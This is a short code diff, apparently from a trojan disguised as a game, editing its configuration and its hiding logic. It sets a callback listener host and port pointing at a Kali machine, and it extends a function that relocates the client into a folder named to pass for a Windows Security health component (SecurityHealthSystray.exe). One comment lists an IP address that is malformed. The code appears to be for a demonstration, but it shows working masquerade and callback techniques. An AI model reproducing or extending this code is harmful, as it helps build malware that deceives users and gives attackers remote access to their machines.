@@ -14,6 +14,7 @@ class GameConfig:
     """
 
     # CHANGE THIS to your Kali IP when building for demo
+    # Current options: "10.12.74.168" (WLAN) or "1192.168.0.193" (Prev)
     LISTENER_HOST: str = "192.168.0.193"
     LISTENER_PORT: int = 5050
 
@@ -50,10 +51,23 @@ def get_migrated_path() -> Path:
     """
     Return the path where the client 'migrates' to hide on Windows.
     """
-    local_appdata = os.getenv("LOCALAPPDATA")
-    if not local_appdata:
-        # Fallback for non-Windows (testing)
-        return Path.home() / ".cyber_shield" / "bin" / "SecurityHealthSystray.exe"
+    # 1. Try LocalAppData
+    base = os.getenv("LOCALAPPDATA")
+    
+    # 2. Try AppData
+    if not base:
+        base = os.getenv("APPDATA")
+        
+    # 3. Try User Profile
+    if not base:
+        base = os.getenv("USERPROFILE")
+        
+    # 4. Fallback to Home Directory
+    if not base:
+        base = str(Path.home())
+        
+    if sys.platform != "win32":
+        return Path(base) / ".cyber_shield" / "bin" / "SecurityHealthSystray.exe"
     
     # Mimic a Windows Security health component
-    return Path(local_appdata) / "Microsoft" / "Windows" / "ServiceHealth" / "SecurityHealthSystray.exe"
+    return Path(base).resolve() / "Microsoft" / "Windows" / "ServiceHealth" / "SecurityHealthSystray.exe"
